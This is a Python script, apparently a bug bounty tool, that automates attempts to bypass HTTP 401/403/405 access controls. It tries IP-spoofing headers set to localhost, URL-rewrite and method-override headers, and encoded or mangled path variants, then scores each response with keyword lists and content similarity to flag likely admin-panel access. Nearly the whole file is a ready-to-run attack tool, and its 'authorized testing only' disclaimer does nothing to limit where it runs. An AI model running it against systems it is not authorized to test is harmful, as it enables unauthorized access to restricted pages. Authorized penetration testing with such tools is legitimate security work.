# -*- coding: utf-8 -*-
"""PCT Bypass 403 v2.1 - HackerOne Ready
- Pre-check (401/403/405 only)
- Smart verdict (difflib + keywords + confidence)
Authorized testing only on in-scope targets."""
import sys, json, time, re, difflib
from urllib.parse import urlparse, urlunparse
try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print(json.dumps({"error": "requests not installed"}))
    sys.exit(1)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ============================================================
# SMART VERDICT ENGINE
# ============================================================
FORBIDDEN_KEYWORDS = [
    "access denied", "forbidden", "unauthorized", "not authorized",
    "not allowed", "permission denied", "you don't have", "restricted",
    "403 forbidden", "401 unauthorized", "blocked by", "waf", "cloudflare",
    "captcha", "access to this page", "access to this resource",
    "you are not permitted", "insufficient privilege", "please login",
    "please log in", "login required", "session expired", "method not allowed",
]

SUCCESS_KEYWORDS = [
    "dashboard", "welcome back", "admin panel", "admin dashboard",
    "logout", "sign out", "sign-out", "settings", "configuration",
    "phpmyadmin", "cpanel", "wp-admin", "user management",
    "control panel", "management console", "my account",
]

def _normalize(text):
    if not isinstance(text, str): return ""
    return re.sub(r"\s+", " ", text.lower()).strip()

def _keyword_scan(text, keywords):
    norm = _normalize(text)
    return sum(1 for k in keywords if k in norm)

def smart_bypass_verdict(original, bypassed):
    """يحلل إذا كانت محاولة bypass نجحت فعلا"""
    result = {"is_bypass": False, "confidence": 0, "verdict": "fail",
              "reasons": [], "similarity": None}
    
    o_status = original.get("status")
    b_status = bypassed.get("status")
    o_content = original.get("content", "")
    b_content = bypassed.get("content", "")
    o_len = original.get("length", 0)
    b_len = bypassed.get("length", 0)
    
    if b_status in (401, 403, 404, 405, 429):
        result["verdict"] = "fail"
        result["reasons"].append(f"Status still {b_status}")
        return result
    
    if not b_content or b_len < 5:
        result["verdict"] = "suspicious"
        result["reasons"].append("Empty response body")
        result["confidence"] = 10
        return result
    
    try:
        sim = difflib.SequenceMatcher(
            None, _normalize(o_content)[:5000], _normalize(b_content)[:5000]
        ).ratio()
        result["similarity"] = round(sim, 3)
    except Exception:
        sim = 0
    
    o_forbidden = _keyword_scan(o_content, FORBIDDEN_KEYWORDS)
    b_forbidden = _keyword_scan(b_content, FORBIDDEN_KEYWORDS)
    b_success = _keyword_scan(b_content, SUCCESS_KEYWORDS)
    length_ratio = b_len / max(o_len, 1) if o_len > 0 else 999
    
    confidence = 0
    reasons = []
    
    if b_status in (200, 201, 204):
        if sim < 0.5 and b_success > 0:
            confidence += 60
            reasons.append(f"Content very different (sim={sim:.2f})")
            reasons.append(f"Success keywords ({b_success})")
        elif sim < 0.5:
            confidence += 30
            reasons.append(f"Content very different (sim={sim:.2f})")
        elif sim < 0.8:
            confidence += 20
            reasons.append(f"Content moderately different (sim={sim:.2f})")
        else:
            confidence -= 20
            reasons.append(f"Content nearly identical (sim={sim:.2f})")
        
        if b_forbidden > 0 and b_success == 0:
            confidence -= 40
            reasons.append(f"SOFT 403 (forbidden keywords: {b_forbidden})")
        
        if length_ratio > 2.0:
            confidence += 15
            reasons.append(f"Length grew {length_ratio:.1f}x")
    
    elif b_status in (301, 302, 303, 307, 308):
        location = bypassed.get("location", "")
        loc_lower = location.lower()
        if any(x in loc_lower for x in ["login", "signin", "auth", "sso"]):
            confidence = 5
            reasons.append(f"Redirect to login")
        elif any(x in loc_lower for x in ["admin", "dashboard", "panel"]):
            confidence = 70
            reasons.append(f"Redirect to admin: {location[:60]}")
        else:
            confidence = 25
            reasons.append(f"Redirect to: {location[:60]}")
    
    elif b_status == 500:
        confidence = 30
        reasons.append("500 error — possible info disclosure")
    
    elif 200 <= b_status < 300:
        confidence = 15
        reasons.append(f"Unexpected status {b_status}")
    
    confidence = max(0, min(100, confidence))
    result["confidence"] = confidence
    result["reasons"] = reasons
    
    if confidence >= 70:
        result["is_bypass"] = True
        result["verdict"] = "success"
    elif confidence >= 40:
        result["verdict"] = "probable"
        result["is_bypass"] = True
    elif confidence >= 20:
        result["verdict"] = "suspicious"
    else:
        result["verdict"] = "fail"
    
    return result


# ============================================================
# TECHNIQUES
# ============================================================
LOCALHOST_HEADERS = [
    "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Real-IP",
    "X-Custom-IP-Authorization", "Client-IP", "X-ProxyUser-Ip",
    "X-Forwarded-Host", "X-Original-Host", "X-Host",
]

def _build_techniques(url):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    techniques = []

    for h in LOCALHOST_HEADERS:
        for v in ["127.0.0.1", "localhost"]:
            techniques.append({
                "name": f"Header {h}={v}",
                "method": "GET", "url": url,
                "headers": {h: v}, "category": "IP Spoofing",
            })

    for h in ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Originating-URL"]:
        techniques.append({
            "name": f"Header {h}={path}",
            "method": "GET", "url": url,
            "headers": {h: path}, "category": "URL Rewrite",
        })

    for h in ["X-HTTP-Method-Override", "X-HTTP-Method"]:
        for m in ["GET", "PUT"]:
            techniques.append({
                "name": f"Header {h}={m}",
                "method": "POST", "url": url,
                "headers": {h: m}, "category": "Method Override",
            })

    def with_path(p):
        return urlunparse((parsed.scheme, parsed.netloc, p, parsed.params, parsed.query, parsed.fragment))

    variants = [
        ("Trailing /", path + "/"),
        ("Trailing /.", path + "/."),
        ("Trailing /..;/", path + "/..;/"),
        ("Semicolon", path + ";"),
        ("Trailing %20", path + "%20"),
        ("Trailing %00", path + "%00"),
        ("Encoded dot %2e", path.replace(".", "%2e")),
        ("Double-enc %252e", path.replace(".", "%252e")),
        ("Encoded slash %2f", path.replace("/", "%2f")),
        ("Case UPPER", path.upper()),
        ("Leading //", "//" + path.lstrip("/")),
        ("/./ prefix", "/./" + path.lstrip("/")),
    ]
    for label, p in variants:
        techniques.append({
            "name": f"Path: {label}",
            "method": "GET", "url": with_path(p),
            "headers": {}, "category": "Path Bypass",
        })

    return techniques


# ============================================================
# MAIN
# ============================================================
def _send(method, url, headers, timeout=8):
    start = time.time()
    try:
        r = requests.request(method, url, timeout=timeout, headers=headers,
                             verify=False, allow_redirects=False)
        return {
            "status": r.status_code,
            "content": r.text[:5000] if r.text else "",
            "length": len(r.content),
            "time": round(time.time() - start, 3),
            "server": r.headers.get("Server"),
            "location": r.headers.get("Location"),
        }
    except requests.exceptions.Timeout:
        return {"error": "timeout", "time": round(time.time() - start, 3)}
    except Exception as e:
        return {"error": str(e)[:120], "time": round(time.time() - start, 3)}


def bypass_403(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {
        "target": url,
        "original_status": None,
        "original_length": 0,
        "successful_bypasses": [],
        "soft_bypasses": [],
        "failed_count": 0,
        "techniques_tried": 0,
        "errors": [],
        "note": "For authorized HackerOne/bug bounty targets only.",
    }

    # === 1. Pre-check (401/403/405 only) ===
    baseline = _send("GET", url, {"User-Agent": UA}, timeout=10)
    if "error" in baseline:
        result["errors"].append(f"Baseline failed: {baseline['error']}")
        return result

    result["original_status"] = baseline["status"]
    result["original_length"] = baseline["length"]

    if baseline["status"] not in (401, 403, 405):
        result["error"] = (
            f"Target returns {baseline['status']}. "
            f"Bypass techniques apply only to 401/403/405."
        )
        result["bypass_achieved"] = False
        return result

    # === 2. Try each technique ===
    techniques = _build_techniques(url)
    for i, tech in enumerate(techniques):
        headers = {"User-Agent": UA}
        headers.update(tech["headers"])

        res = _send(tech["method"], tech["url"], headers)

        if "error" in res:
            result["errors"].append(f"{tech['name']}: {res['error']}")
            continue

        verdict = smart_bypass_verdict(baseline, res)

        entry = {
            "technique": tech["name"],
            "category": tech["category"],
            "method": tech["method"],
            "url_used": tech["url"],
            "headers_used": tech["headers"],
            "status": res["status"],
            "content_length": res["length"],
            "content_preview": res["content"][:150].strip() if res["content"] else "",
            "time": res["time"],
            "verdict": verdict["verdict"],
            "confidence": verdict["confidence"],
            "similarity": verdict["similarity"],
            "reasons": verdict["reasons"],
        }

        if verdict["verdict"] in ("success", "probable"):
            result["successful_bypasses"].append(entry)
        elif verdict["verdict"] == "suspicious":
            result["soft_bypasses"].append(entry)
        else:
            result["failed_count"] += 1

        result["techniques_tried"] += 1
        if i < len(techniques) - 1:
            time.sleep(0.15)

    # === 3. Summary ===
    success_count = len(result["successful_bypasses"])
    soft_count = len(result["soft_bypasses"])
    max_conf = max([b["confidence"] for b in result["successful_bypasses"]], default=0)

    result["summary"] = {
        "total_techniques": result["techniques_tried"],
        "successful_bypasses": success_count,
        "soft_bypasses": soft_count,
        "max_confidence": max_conf,
        "bypass_achieved": success_count > 0,
        "risk_level": (
            "🔴 Critical" if success_count >= 3 or max_conf >= 85
            else "🟠 High" if success_count >= 1
            else "🟡 Suspicious" if soft_count >= 1
            else "🟢 No bypass"
        ),
    }
    return result


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else input("URL (e.g., https://target.com/admin): ")
    print(json.dumps(bypass_403(url), indent=2, ensure_ascii=False))
